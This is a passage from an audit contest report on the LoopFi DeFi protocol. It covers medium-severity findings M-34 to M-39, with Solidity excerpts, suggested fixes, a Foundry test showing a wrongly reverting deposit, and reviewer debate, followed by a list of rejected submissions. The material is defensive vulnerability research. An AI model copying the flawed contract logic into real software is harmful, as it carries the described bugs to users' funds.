The issue here is, the leverParams.auxSwap swap is an EXACT_IN swap, and user would hardcode the amount of inTokens used for this swap. There is no way to know the exact amount of collateral tokens left after step 4, so there must still be some collateral tokens leftover after the leverParams.auxSwap.

These leftover tokens are not sent to anybody, and stuck in the contract.

function decreaseLever ( LeverParams calldata leverParams, uint256 subCollateral, address residualRecipient ) external onlyDelegatecall { // validate the primary swap if ( leverParams.

primarySwap.

swapType != SwapType.

EXACT_OUT || leverParams.

primarySwap.

recipient != self ) revert PositionAction__decreaseLever_invalidPrimarySwap (); // validate aux swap if it exists > if ( leverParams.

auxSwap.

assetIn != address ( 0 ) && ( leverParams.

auxSwap.

swapType != SwapType.

EXACT_IN )) revert PositionAction__decreaseLever_invalidAuxSwap ();...

} function onCreditFlashLoan ( address /*initiator*/, uint256 /*amount*/, uint256 /*fee*/, bytes calldata data ) external returns ( bytes32 ) { if ( msg.

sender != address ( flashlender )) revert PositionAction__onCreditFlashLoan__invalidSender (); ( LeverParams memory leverParams, uint256 subCollateral, address residualRecipient ) = abi.

decode ( data,( LeverParams, uint256, address )); uint256 subDebt = leverParams.

primarySwap.

amount; underlyingToken.

forceApprove ( address ( leverParams.

vault ), subDebt ); // sub collateral and debt ICDPVault ( leverParams.

vault ).

modifyCollateralAndDebt ( leverParams.

position, address ( this ), address ( this ), 0, - toInt256 ( subDebt ) ); // withdraw collateral and handle any CDP specific actions uint256 withdrawnCollateral = _onDecreaseLever ( leverParams, subCollateral ); bytes memory swapData = _delegateCall ( address ( swapAction ), abi.

encodeWithSelector ( swapAction.

swap.

selector, leverParams.

primarySwap ) ); uint256 swapAmountIn = abi.

decode ( swapData, ( uint256 )); // swap collateral to stablecoin and calculate the amount leftover uint256 residualAmount = withdrawnCollateral - swapAmountIn; // send left over collateral that was not needed to payback the flash loan to `residualRecipient` if ( residualAmount > 0 ) { // perform swap from collateral to arbitrary token if necessary > if ( leverParams.

auxSwap.

assetIn != address ( 0 )) { _delegateCall ( address ( swapAction ), abi.

encodeWithSelector ( swapAction.

swap.

selector, leverParams.

auxSwap ) ); } else { // otherwise just send the collateral to `residualRecipient` IERC20 ( leverParams.

primarySwap.

assetIn ).

safeTransfer ( residualRecipient, residualAmount ); } underlyingToken.

forceApprove ( address ( flashlender ), subDebt ); return CALLBACK_SUCCESS_CREDIT; }

## Recommended Mitigation Steps

Send the amount of IERC20(leverParams.primarySwap.assetIn).balance(address(this)) to residualRecipient to make sure there are no leftovers.

amarcu (LoopFi) confirmed

# [M-34] PositionAction.sol#_deposit incorrectly checks auxSwap.assetIn should be equal to collateralParams.targetToken

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-34
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

PositionAction.sol#_deposit incorrectly checks auxSwap.assetIn should be equal to collateralParams.targetToken Submitted by pkqs90 PositionAction.sol#_deposit incorrectly checks auxSwap.assetIn should be equal to collateralParams.targetToken. This is incorrect, because auxSwap.assetIn should be the token used to swap for collateralParams.targetToken.

Bug Description First, let’s inspect how deposit works with swap enabled:

collateralParams.collateralizer transfers auxSwap.assetIn token to Proxy.

Proxy performs a swap (Balancer or Uniswap) to get collateral token.

Deposit collateral tokens.

The issue here is, during step 2, the swap is to exchange auxSwap.assetIn for collateralParams.targetToken. This means that the two tokens must not be equal. However, the current implementation checks that they are the same. This means the swap feature is completely unusable.

function _deposit ( address vault, address position, CollateralParams calldata collateralParams, PermitParams calldata permitParams ) internal returns ( uint256 ) { uint256 amount = collateralParams.

amount; if ( collateralParams.

auxSwap.

assetIn != address ( 0 )) { if ( > collateralParams.

auxSwap.

assetIn != collateralParams.

targetToken || collateralParams.

auxSwap.

recipient != address ( this ) revert PositionAction__deposit_InvalidAuxSwap (); amount = _transferAndSwap ( collateralParams.

collateralizer, collateralParams.

auxSwap, permitParams ); } else if ( collateralParams.

collateralizer != address ( this )) { _transferFrom ( collateralParams.

targetToken, collateralParams.

collateralizer, address ( this ), amount, permitParams ); } return _onDeposit ( vault, position, collateralParams.

targetToken, amount ); }

## Recommended Mitigation Steps

Remove the check.

]# Assessed type Invalid Validation amarcu (LoopFi) disputed and commented:

The flow is correct, for example this is a test function where we go from USDC to the collateral token.

function test_deposit_vault_with_entry_swap_from_USDC() public { uint256 depositAmount = 10_000 * 1e6; uint256 amountOutMin = (depositAmount * 1e12 * 98) / 100; // convert 6 decimals to 18 and add 1% slippage deal(address(USDC), user, depositAmount); // build increase collateral params bytes32[] memory poolIds = new bytes32[](1); poolIds[0] = stablePoolId; address[] memory assets = new address[](2); assets[0] = address(USDC); assets[1] = address(token); CollateralParams memory collateralParams = CollateralParams({ targetToken: address(USDC), amount: 0, // not used for swaps collateralizer: address(user), auxSwap: SwapParams({ swapProtocol: SwapProtocol.BALANCER, swapType: SwapType.EXACT_IN, assetIn: address(USDC),

amount: depositAmount, // amount to swap in limit: amountOutMin, // min amount of collateral token to receive recipient: address(userProxy), deadline: block.timestamp + 100, args: abi.encode(poolIds, assets) }) }); uint256 expectedCollateral = _simulateBalancerSwap(collateralParams.auxSwap); vm.prank(user); USDC.approve(address(userProxy), depositAmount); vm.prank(user); userProxy.execute( address(positionAction), abi.encodeWithSelector( positionAction.deposit.selector, address(userProxy), address(vault), collateralParams, emptyPermitParams ) ); (uint256 collateral, uint256 debt,,,, ) = vault.positions(address(userProxy)); assertEq(collateral, expectedCollateral); assertEq(debt, 0); } Koolex (judge) commented:

Requesting a PoC from the warden, only in PJQA please. Will re-evaluate then.

pkqs90 (warden) commented:

@amarcu @Koolex - First, let’s see how CollateralParams is defined. From // optional swap from targetToken to collateral, or collateral to targetToken we can see that if there is a swap existent, the targetToken can be either the inputToken or the outputToken. The issue is that the buggy check forces targetToken to be inputToken, and does not allow for it being the output token.

struct CollateralParams { // token passed in or received by the caller address targetToken; // amount of collateral to add in CDPVault.tokenScale() or to remove in WAD uint256 amount; // address that will transfer the collateral or receive the collateral address collateralizer; // optional swap from `targetToken` to collateral, or collateral to `targetToken` SwapParams auxSwap; } if ( collateralParams.

auxSwap.

assetIn != address ( 0 )) { if ( > collateralParams.

auxSwap.

assetIn != collateralParams.

targetToken || collateralParams.

auxSwap.

recipient != address ( this ) revert PositionAction__deposit_InvalidAuxSwap (); amount = _transferAndSwap ( collateralParams.

collateralizer, collateralParams.

auxSwap, permitParams ); }...

return _onDeposit ( vault, position, collateralParams.

targetToken, amount ); We can also see that at the end of the function, a _onDeposit(vault, position, collateralParams.targetToken, amount); is called to deposit the token to vault, which passes on the collateralParams.targetToken for depositing in vault.

The most common use case is to swap random input tokenA to targetToken, and deposit targetToken into vault. For this case, if we force targetToken to be inputToken, the swap doesn’t make sense.

Now, responding to the passing unit test. The unit test dataflow is, user sets USDC as inputToken, and targetToken also as USDC. However, the vault receives a different token than USDC. But why did the unit test pass?

Because for the PositionAction20.sol, the onDeposit() function doesn’t about care the passed in token; thus, it doesn’t matter whichever token we set as targetToken. But for PositionAction4626.sol, the targetToken is used to check if it is the collateral for vault, and if not, it will perform a ERC4626 deposit first, and in this case, if the targetToken is incorrect, the deposit would fail.

vault = createCDPVault ( token, // token 5_000_000 ether, // debt ceiling 0, // debt floor 1.25 ether, // liquidation ratio 1.0 ether, // liquidation penalty 1.05 ether // liquidation discount ); PositionAction20.sol:

function _onDeposit ( address vault, address position, address /*src*/, uint256 amount ) internal override returns ( uint256 ) { address collateralToken = address ( ICDPVault ( vault ).

token ()); IERC20 ( collateralToken ).

forceApprove ( vault, amount ); return ICDPVault ( vault ).

deposit ( position, amount ); } function _onDeposit ( address vault, address /*position*/, address src, uint256 amount ) internal override returns ( uint256 ) { address collateral = address ( ICDPVault ( vault ).

token ()); // if the src is not the collateralToken, we need to deposit the underlying into the ERC4626 vault @> if ( src != collateral ) { address underlying = IERC4626 ( collateral ).

asset (); IERC20 ( underlying ).

forceApprove ( collateral, amount ); amount = IERC4626 ( collateral ).

deposit ( amount, address ( this )); } IERC20 ( collateral ).

forceApprove ( vault, amount ); return ICDPVault ( vault ).

deposit ( address ( this ), amount ); } Koolex (judge) commented:

@pkqs90 PoC (coded) is requested. Please provide it ASAP.

Also the impact is not clear. I am assuming the report implies that the functionality doesn’t work as intended. But elaboration on this is required.

PositionAction.sol#_deposit incorrectly checks auxSwap.assetIn should be equal to collateralParams.targetToken. This is incorrect, because auxSwap.assetIn should be the token used to swap for collateralParams.targetToken..

pkqs90 (warden) commented:

@Koolex - I created a PoC based on the UT the sponsors provided. There are only 2 changes (which I also commented out in code):

Use PositionAction4626 instead of PositionAction20.

Change targetToken to token, since the vault’s collateral token is token. (The previous UT test_deposit_vault_with_entry_swap_from_USDC marked this as USDC, which is incorrect).

Put this code inside PositionAction20.t.sol, and you will find this code reverts with error PositionAction__deposit_InvalidAuxSwap. However, this should not revert, because the input it provides is correct.

The use case is: User initially has USDC, user wishes to perform swap from USDC to token and deposit token in vault.

function test_PoC () public { // Change 1: Use PositionAction4626 instead of PositionAction20.

PositionAction4626 positionAction4626 = new PositionAction4626 ( address ( flashlender ), address ( swapAction ), address ( poolAction ), address ( vaultRegistry ) ); uint256 depositAmount = 10_000 * 1e6; uint256 amountOutMin = ( depositAmount * 1e12 * 98 ) / 100; // convert 6 decimals to 18 and add 1% slippage deal ( address ( USDC ), user, depositAmount ); // build increase collateral params bytes32 [] memory poolIds = new bytes32 []( 1 ); poolIds [ 0 ] = stablePoolId; address [] memory assets = new address []( 2 ); assets [ 0 ] = address ( USDC ); assets [ 1 ] = address ( token ); // Change 2: Change targetToken to `token`, since the vault's collateral token is `token`. (The previous UT `test_deposit_vault_with_entry_swap_from_USDC` marked this as `USDC`, which is incorrect ).

CollateralParams memory collateralParams = CollateralParams ({ targetToken:

address ( token ), amount:

0, // not used for swaps collateralizer:

address ( user ), auxSwap:

SwapParams ({ swapProtocol:

SwapProtocol.

BALANCER, swapType:

SwapType.

EXACT_IN, assetIn:

address ( USDC ), amount:

depositAmount, // amount to swap in limit:

amountOutMin, // min amount of collateral token to receive recipient:

address ( userProxy ), deadline:

block.

timestamp + 100, args:

abi.

encode ( poolIds, assets ) }) }); uint256 expectedCollateral = _simulateBalancerSwap ( collateralParams.

auxSwap ); vm.

prank ( user ); USDC.

approve ( address ( userProxy ), depositAmount ); vm.

prank ( user ); userProxy.

execute ( address ( positionAction4626 ), abi.

encodeWithSelector ( positionAction4626.

deposit.

selector, address ( userProxy ), address ( vault ), collateralParams, emptyPermitParams ) ); ( uint256 collateral, uint256 debt,,,, ) = vault.

positions ( address ( userProxy )); assertEq ( collateral, expectedCollateral ); assertEq ( debt, 0 ); } Koolex (judge) commented:

@pkqs90 Error (7920): Identifier not found or not unique.

--> src/test/integration/PositionAction20.t.sol:861:9:

| 861 | PositionAction4626 positionAction4626 = new PositionAction4626( Anything to add here to fix this error?

pkqs90 (warden) commented:

@Koolex - Add this import in the beginning of file:

import { PositionAction4626 } from "../../proxy/PositionAction4626.sol"; Koolex (judge) commented:

The function reverts as @pkqs90 stated.

[FAIL. Reason:

PositionAction__deposit_InvalidAuxSwap ()] test_PoC () (gas: 4270979) Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 884.18ms (4.20ms CPU time) Ran 1 test suite in 887.08ms (884.18ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests) Failing tests:

Encountered 1 failing test in src/test/integration/PositionAction20.t.sol:PositionAction20Test [FAIL. Reason:

PositionAction__deposit_InvalidAuxSwap ()] test_PoC () (gas: 4270979) The most common use case is to swap random input tokenA to targetToken, and deposit targetToken into vault. For this case, if we force targetToken to be inputToken, the swap doesn’t make sense.

I believe this is a valid concern. Stays as-is. The function doesn’t seem to work as intended.

# [M-35] PositionAction4626.sol#_onWithdraw should withdraw from position CDPVault position instead of address(this)

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-35
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

PositionAction4626.sol#_onWithdraw should withdraw from position CDPVault position instead of address(this) Submitted by pkqs90, also found by pkqs90 and zhaojohnson In PositionAction4626, the _onWithdraw should withdraw the token from position CDPVault position. However, currently it withdraws from address(this). This is inconsistent to the parent contract PositionAction.sol, which specifically states the operation should handle the position address.

Also, in contrast, we can check the PositionAction20 contract, it withdraws from the position address.

PositionAction4626.sol:

function _onWithdraw ( address vault, address /*position*/, address dst, uint256 amount ) internal override returns ( uint256 ) { > uint256 collateralWithdrawn = ICDPVault ( vault ).

withdraw ( address ( this ), amount ); // if collateral is not the dst token, we need to withdraw the underlying from the ERC4626 vault address collateral = address ( ICDPVault ( vault ).

token ()); if ( dst != collateral ) { collateralWithdrawn = IERC4626 ( collateral ).

redeem ( collateralWithdrawn, address ( this ), address ( this )); } return collateralWithdrawn; } PositionAction20.sol:

function _onWithdraw ( address vault, address position, address /*dst*/, uint256 amount ) internal override returns ( uint256 ) { > return ICDPVault ( vault ).

withdraw ( position, amount ); } PositionAction.sol:

/// @notice Hook to withdraw collateral from CDPVault, handles any CDP specific actions /// @param vault The CDP Vault > /// @param position The CDP Vault position /// @param dst Token the caller expects to receive /// @param amount The amount of collateral to deposit [wad] /// @return Amount of collateral (or dst) withdrawn [CDPVault.tokenScale()] function _onWithdraw ( address vault, address position, address dst, uint256 amount ) internal virtual returns ( uint256 );

## Recommended Mitigation Steps

- uint256 collateralWithdrawn = ICDPVault(vault).withdraw(address(this), amount); + uint256 collateralWithdrawn = ICDPVault(vault).withdraw(position, amount); amarcu (LoopFi) confirmed Koolex (judge) commented:

Please elaborate on the impact, will re-evaluate in PJQA.

pkqs90 (warden) commented:

@Koolex - The proxy supports depositing/withdrawing collateral from positions other than the proxy itself. An example can be found in unit tests, where a user creates a position for another address (aliceProxy).

The issue here is that for PositionAction4626, it only supports actions on the vault of the sender proxy, and not any other address. To make a comparison, both PositionAction20 and PositionActionPendle supports it, only PositionAction4626 lack this functionality.

function test_deposit_to_an_unrelated_position () public { // create 2nd position address alice = vm.

addr ( 0x45674567 ); PRBProxy aliceProxy = PRBProxy ( payable ( address ( prbProxyRegistry.

deployFor ( alice )))); uint256 depositAmount = 10_000 ether; deal ( address ( token ), user, depositAmount ); CollateralParams memory collateralParams = CollateralParams ({ targetToken:

address ( token ), amount:

depositAmount, collateralizer:

address ( user ), auxSwap:

emptySwap // no entry swap }); vm.

prank ( user ); token.

approve ( address ( userProxy ), depositAmount ); vm.

prank ( user ); userProxy.

execute ( address ( positionAction ), abi.

encodeWithSelector ( positionAction.

deposit.

selector, address ( aliceProxy ), address ( vault ), collateralParams, emptyPermitParams ) ); ( uint256 collateral, uint256 debt,,,, ) = vault.

positions ( address ( aliceProxy )); assertEq ( collateral, depositAmount ); assertEq ( debt, 0 ); } Koolex (judge) commented:

Stays as-is.

# [M-36] ChefIncentivesController caches endRewardTime , which is not required, and may cause issues during reward update

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-36
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

endRewardTime, which is not required, and may cause issues during reward update Submitted by pkqs90, also found by pkqs90, hash ( 1, 2 ), and novamanbg When calculating the endRewardTime, there is a cache mechanism that caches the result for endingTime.updateCadence (in UT it is set to 2 days). However, during this period, if anything changes, the endRewardTime would be incorrect. For example:

If rewardsPerSecond increases, then the real endRewardTime would be smaller than the cached endRewardTime.

If new rewards (LOOP Tokens) are registered, the real endRewardTime would be larger than the cached endRewardTime.

If the cached endRewardTime is smaller than expected, this will cause the rewards to be not distributed for the time period.

If the cached endRewardTime is larger than expected, the some pools may receive rewards after when they should, causing less rewards for other pools.

function _updatePool ( VaultInfo storage pool, uint256 _totalAllocPoint ) internal { uint256 timestamp = block.

timestamp; uint256 endReward = endRewardTime (); if ( endReward <= timestamp ) { timestamp = endReward; } if ( timestamp <= pool.

lastRewardTime ) { return; } ( uint256 reward, uint256 newAccRewardPerShare ) = _newRewards ( pool, _totalAllocPoint ); accountedRewards = accountedRewards + reward; pool.

accRewardPerShare = pool.

accRewardPerShare + newAccRewardPerShare; pool.

lastRewardTime = timestamp; } function endRewardTime () public returns ( uint256 ) { if ( endingTime.

lastUpdatedTime + endingTime.

updateCadence > block.

timestamp ) { > return endingTime.

estimatedTime; } uint256 unclaimedRewards = availableRewards (); uint256 extra = 0; uint256 length = poolLength (); for ( uint256 i; i < length; ) { VaultInfo storage pool = vaultInfo [ registeredTokens [ i ]]; if ( pool.

lastRewardTime > lastAllPoolUpdate ) { extra += (( pool.

lastRewardTime - lastAllPoolUpdate ) * pool.

allocPoint * rewardsPerSecond ) / totalAllocPoint; } unchecked { i ++; } endingTime.

lastUpdatedTime = block.

timestamp; if ( rewardsPerSecond == 0 ) { endingTime.

estimatedTime = type ( uint256 ).

max; return type ( uint256 ).

max; } else { uint256 newEndTime = ( unclaimedRewards + extra ) / rewardsPerSecond + lastAllPoolUpdate; endingTime.

estimatedTime = newEndTime; return newEndTime; }

## Recommended Mitigation Steps

Always recalculate for endRewardTime() and remove the cache. This is acceptable, because the _updatePool() function is only called upon user interactions, and not called regularly, so it is not requried to save gas here.

amarcu (LoopFi) confirmed

# [M-37] SwapAction.sol#balancerSwap does not support native ETH as input token

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-37
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

SwapAction.sol#balancerSwap does not support native ETH as input token Submitted by pkqs90, also found by pkqs90, Centaur ( 1, 2, 3, 4 ), and Sparrow SwapAction is used to swap tokens using Balancer/Uniswap or join/exit a Pendle pool. Pendle accepts native ETH as input token when joining a Pendle pool, and Balancer accepts native ETH during swap.

We can check that the SwapAction contract also supports passing native ETH as input token, because:

swap() function, which serves as the entry function, is payable; pendleJoin() passes msg.value along when calling pendleRouter.addLiquiditySingleToken().

However, the issue is that when performing a balancer swap by balancerVault.batchSwap, the msg.value is not passed along.

function swap ( SwapParams memory swapParams ) public payable returns ( uint256 retAmount ) { if ( swapParams.

swapProtocol == SwapProtocol.

BALANCER ) { ( bytes32 [] memory poolIds, address [] memory assetPath ) = abi.

decode ( swapParams.

args, ( bytes32 [], address []) ); retAmount = balancerSwap ( swapParams.

swapType, swapParams.

assetIn, poolIds, assetPath, swapParams.

amount, swapParams.

limit, swapParams.

recipient, swapParams.

deadline ); } else if ( swapParams.

swapProtocol == SwapProtocol.

UNIV3 ) { retAmount = uniV3Swap ( swapParams.

swapType, swapParams.

assetIn, swapParams.

amount, swapParams.

limit, swapParams.

recipient, swapParams.

deadline, swapParams.

args ); } else if ( swapParams.

swapProtocol == SwapProtocol.

PENDLE_IN ) { retAmount = pendleJoin ( swapParams.

recipient, swapParams.

limit, swapParams.

args ); } else if ( swapParams.

swapProtocol == SwapProtocol.

PENDLE_OUT ) { retAmount = pendleExit ( swapParams.

recipient, swapParams.

amount, swapParams.

args ); } else revert SwapAction__swap_notSupported (); // Transfer any remaining tokens to the recipient if ( swapParams.

swapType == SwapType.

EXACT_OUT && swapParams.

recipient != address ( this )) { IERC20 ( swapParams.

assetIn ).

safeTransfer ( swapParams.

recipient, swapParams.

limit - retAmount ); } function balancerSwap ( SwapType swapType, address assetIn, bytes32 [] memory poolIds, address [] memory assets, uint256 amount, uint256 limit, address recipient, uint256 deadline ) internal returns ( uint256 ) {...

return abs ( // @auditnote: BUG. Does not pass msg.value.

@> balancerVault.

batchSwap ( kind, swaps, assets, FundManagement ({ sender:

address ( this ), fromInternalBalance:

false, recipient:

payable ( recipient ), toInternalBalance:

false }), limits, deadline )[ pathLength ] ); } function pendleJoin ( address recipient, uint256 minOut, bytes memory data ) internal returns ( uint256 netLpOut ){ ( address market, ApproxParams memory guessPtReceivedFromSy, TokenInput memory input, LimitOrderData memory limit ) = abi.

decode ( data, ( address, ApproxParams, TokenInput, LimitOrderData )); if ( input.

tokenIn != address ( 0 )) { input.

netTokenIn = IERC20 ( input.

tokenIn ).

balanceOf ( address ( this )); IERC20 ( input.

tokenIn ).

forceApprove ( address ( pendleRouter ), input.

netTokenIn ); } ( netLpOut,,) = pendleRouter.

addLiquiditySingleToken {value:

msg.

value }( recipient, market, minOut, guessPtReceivedFromSy, input, limit ); }

## Recommended Mitigation Steps

- balancerVault.batchSwap( + balancerVault.batchSwap{value: msg:value}( 0xtj24 (LoopFi) confirmed

# [M-38] PositionAction20._onWithdraw and PositionPendle20._onWithdraw also returns token amount in wrong scale

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-38
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

PositionAction20._onWithdraw and PositionPendle20._onWithdraw also returns token amount in wrong scale Submitted by nnez, also found by pkqs90 Withdraw operations will invariably revert due to insufficient funds if the collateral’s decimal deviates from 18.

# [M-39] Lack of slippage check while interacting with ERC4626 Vault in PositionAction4626 could lead to users’ fund loss

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-39
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

PositionAction4626 could lead to users’ fund loss Submitted by nnez Users’ funds loss from ERC4626 exchange rate change or manipulated.

## Assessed type

ERC4626 amarcu (LoopFi) confirmed and commented:

Adding the splippage check will help but the funds are not directly at risk and cannot be stolen. We suggest this issue be a medium and not a high.

Koolex (judge) decreased severity to Medium Infect3d (warden) commented:

As said by the sponsor, the funds are not at risk. I cannot think a case where slippage when depositing/withdrawing in a 4626 vault could cause a loss of fund. User depositing in a Vault simply get shares representing how much of the total vault he deposited.

If he redeem, he will get back his assets, or more if vault yielded in between. All issues about slippage when depositing/withdrawing from a 4626 vaults are invalid.

nnez (warden) commented:

Firstly, sponsors said that funds are not directly at risk. That doesn’t mean there are no funds at risk. There is always some degree of slippage loss when depositing or minting in an ERC4626 vault, and this loss is directly tied to the ERC4626 exchange rate.

As noted in OpenZeppelin’s documentation, the exchange rate can fluctuate, leading to discrepancies between the amount deposited and the corresponding shares received. A log-scale graph of this relationship highlights that the shares received may not accurately reflect the deposited amount due to these exchange rate changes.

ERC4626 is inherently prone to this issue because it was designed to be called by smart contract account not by EOA. It assumes that any integrating smart contract will implement slippage protection, ensuring that the shares received can be redeemed within an allowed slippage range. Without such protection, EOAs are more vulnerable to losses from exchange rate fluctuations. This concern is further discussed in detail by the Ethereum Magicians community in their proposal for EIP-5143 (Slippage Protection for Tokenized Vaults).

Additionally, Zellic’s analysis of ERC4626 vaults highlights the risks for EOAs when interacting directly with these vaults, specifically mentioning that “what you give is not necessarily what you get” due to slippage and exchange rate variability ( source 1, source 2 ).

The ERC4626 standard contract of OZ acknowledges slippage concerns, as shown in the comments IERC4626 interface.

Moreover, the audit information do not specify which ERC4626 vault will be integrated. As a result, we must assume the contract should be compatible with any vault adhering to the ERC4626 standard, including those susceptible to exchange rate manipulation. Without slippage protection in place, slippage losses could be as high as 100%. ( exchange rate manipulation in ERC4626 vaults ).

Technical aside, if slippage during interactions with ERC4626 vaults were not a significant issue, it wouldn’t be such a widely discussed topic. The prevalence of discussions around slippage highlights the importance of addressing this concern.

Infect3d (warden) commented:

@nnez - The OZ source discuss about rounding error, here’s what they say:

This rounding is often negligible because of the amount at stake. If you deposit 1e9 shares worth of tokens, the rounding will have you lose at most 0.0000001% of your deposit. However if you deposit 10 shares worth of tokens, you could lose 10% of your deposit Tokens have at least 6 decimals, so the rounding error is at most 0.0001%, which is negligible.

The Zellic source is referring to “slippage” due to:

Rounding error, we already shown that this is negligible, unless the exchange rate are so high and close to the token decimals that it is not considered dust.

Vault deposit/withdraw fees. But vault fees are known in advance so user should be able to carefully select the values he will input when calling the vault functions to take into account the fees.

Zellic examples doesn’t seems to relate with what is referred as slippage in the submissions: they discuss about the difference of asset taken from user them when he calls mint, and asset given to user them when he calls redeem.

The amount of underlying assets a user may receive through redeeming their shares in the vault ( previewRedeem ) can be significantly different than the amount that would be taken from them when minting the same quantity of shares ( previewMint ). The differences may be small (e.g., if due to rounding error) or significant (e.g., if a vault implements withdrawal or deposit fees) In those conditions don’t see how adding a slippage parameter will prevent this, if we consider user is aware of the fees, and of the exchange rate ? If the Vault sees his assets increasing due to yield before user “redeem” tx is executed, then he will get more asset than expected before the yield. Same logic can apply for deposit, if vault yielded, he will have at least a better position.

About the exchange rate manipulation in Euler article, all of these manipulation goals are to increase the exchange rate by sending assets into the vault without minting the expected number of equivalent shares (the idea being to increase share price and use the inflated shares to borrow in another protocol, and the attack is usually executed in 1 tx.

Also, an increased exchange rate would be beneficial for someone withdrawing from the vault, as his shares would allow him to withdraw more assets.

To finish, I agree there are situations where a harmful slippage could occur:

When the vault incur a loss right before user tx is executed (how ?); If user is subject to first depositor attack.

But in my opinion, 1 shouldn’t occur in a vault meant to generate yield and 2 too, as far as the vault implement recent ERC4626 contracts or follows well known practices to avoid it.

nnez (warden) commented:

No problem @Infect3d. My answer was also long and I do appreciate you taking the time and sorry if you find some of the examples not quite relevant.

However, your answer actually sent me into the rabbit hole, searching for my answer on the topic.

The exchange rate of ERC4626 vault depends on how the vault utilize its assets (its strategy), the yield-bearing notion doesn’t necessitate that the exchange rate is an ever-growing rate.

The example is actually the StakingLPEth contract itself. When the protocol implements a mechanism to distribute loss from bad debt among shareholders ( #186 ), this can be a great example to answer your question.

“A liquidation transaction that realizes the bad debt for the vault is executed before users’ withdrawal transaction”.

This can be problematic as users might want to exit as fast as possible before the loss is realized but if they fail to do so they might want to hold on to those shares and decide not to realize the loss right away (as they can choose wait for the interest rate or protocol reserve to catch up). A slippage protection mechanism can definitely help with this situation.

I agree that the first depositor attack should practically be mitigated if the vault owner follows a proper security practice.

However, we’re dealing with a generic ERC4626 here as the audit information doesn’t specify which vault is going to be integrate into the protocol. An integrating vault might not use OZ ERC4626 as the base contract and the mitigating mechanism (which ERC4626 also doesn’t dictate this) might not be there.

In conclusion, Can happen under certain situations and it can cause unexpected loss.

Can happen but the likelihood depends on how you view the burden of implementing mitigation of the integrating vault as the standard doesn’t dictate it. I found this while I was digging around the topic:

- https://forum.openzeppelin.com/t/erc4626-inflation-attack-discussion/41643/9
- https://github.com/OpenZeppelin/openzeppelin-contracts/issues/5223
It seems like _decimalsOffset might not be effective against inflation attack on an empty vault in some cases Infect3d (warden) commented:

@nnez, thank you again, really appreciated these insightful information you provided.

You are right here, forgot that PoolV3 had that peculiarity (all these escalations I’ve created come from notes I’ve taken ~ 2 months ago).

Very interesting situation here, risky but well thought. Never seen this used until today, thanks for sharing. I don’t have much to add to this conversation, what you say make sense.

Koolex (judge) commented:

Thanks everyone. This stays as-is.

## Rejected Primary Findings

# Rejected Primary Findings: LoopFi

# Users can compute Permit2 signature for any ERC20 token, ultimately stealing from `PositionAction`'s Ether

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-401
- **Submitter:** 0xBugSlayer
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/401
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-401.md

## Brief Summary

Depositing less valuable tokens to the `CDPVault` and stealing all of the `PositionAction`'s Ether

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary

# Unbounded Credit Manager Debt Limit Allows Violation of Assets >= Borrowed Invariant

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-298
- **Submitter:** 0xbrett8571
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/298
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-298.md

## Brief Summary

`setCreditManagerDebtLimit()` allows setting a credit manager's debt limit to any value without validation. This can lead to a scenario where the total borrowed amount exceeds the total assets in the pool, violating a critical invariant. Impact If a credit manager's debt limit is set too high, it can cause the pool's `totalBorrowed` to surpass `totalAssets`. This breaks the fundamental invariant `totalAssets >= totalBorrowed`, which is essential for maintaining the pool's solvency and correct operation. Even without malicious intent, incorrectly setting debt limits can lead to accounting errors and loss of user confidence in the system.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_90_group

# Incorrect Borrowable Amount Calculation in edge case.

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-712
- **Submitter:** Afriauditor
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/712
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-712.md

## Brief Summary

The current implementation of the creditManagerBorrowable function does not check the borrowable amount against the available() function. This could lead to wrong borrowable value in scenarios where the function returns a borrowable amount greater than the actual available liquidity in the pool. though it checks availableToBorrow in interestRateModel contract however there is no way we can tell if it returns a value greater than availableLiquidity() which is the actual liquidity in the contract, because if it does availableLiquidity() becomes the actual Amount available to borrow.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_64_group

# Incorrect Rounding in Conversion Functions Allows Asset Drain (`AuraVault::withdraw` and `AuraVault::mint`)

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-280
- **Submitter:** Agontuk
- **Claimed severity:** High
